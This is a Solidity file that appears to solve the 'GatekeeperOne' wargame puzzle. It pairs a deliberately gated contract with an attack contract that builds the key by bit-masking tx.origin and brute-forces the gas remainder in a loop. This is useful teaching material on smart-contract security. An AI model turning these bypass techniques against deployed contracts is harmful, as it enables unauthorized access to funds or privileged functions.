// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0xab5d7a119860b15fbdbcd374f67da2cf8d6303ded018fe3ce4b39a07bfd80c4c

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract GatekeeperOneAttack
{

    GatekeeperOne gatekeeperoneaddress;

    constructor(address _gatekeeperoneaddress)
    {
        gatekeeperoneaddress = GatekeeperOne(_gatekeeperoneaddress);
    }

    function attack() external 
    {
        bytes8 _gateKey = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFFF0000FFFF;

        for (uint256 i = 0; i <= 8191; i++) {
    try gatekeeperoneaddress.enter{gas: 800000 + i}(_gateKey) {
        break;
    } catch {}
}
    }

}
